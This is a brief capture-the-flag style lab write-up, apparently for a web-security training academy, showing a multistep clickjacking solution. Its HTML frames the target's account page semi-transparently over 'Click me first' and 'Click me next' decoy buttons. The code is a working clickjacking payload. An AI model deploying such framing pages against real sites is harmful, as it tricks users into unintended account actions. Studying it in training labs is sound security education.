# Lab: Multistep clickjacking
## Description
Just added another button to trick user into clicking twice.

## Solution
```html
<html>
<head>
<style>
    #target_website {
      position:relative;
      width:528px;
      height:620px;
      opacity:0.60001;
	  margin-bottom: 200px;
      z-index:2;
      }
    #decoy_website {
      position:absolute;
	  top:520px;
	  left:45px;
      width:300px;
      height:400px;
      z-index:1;
      }
  </style>
</head>
<body>
	<div id="decoy_website"><button style="width: 130px; height:25px;">Click me first</button></div>
	<div id="decoy_website2"><button style="width: 100px; height:25px;">Click me next</button></div>
	<iframe id="target_website" src="https://target.web-security-academy.net/my-account"></iframe>
</body>
</html>
```
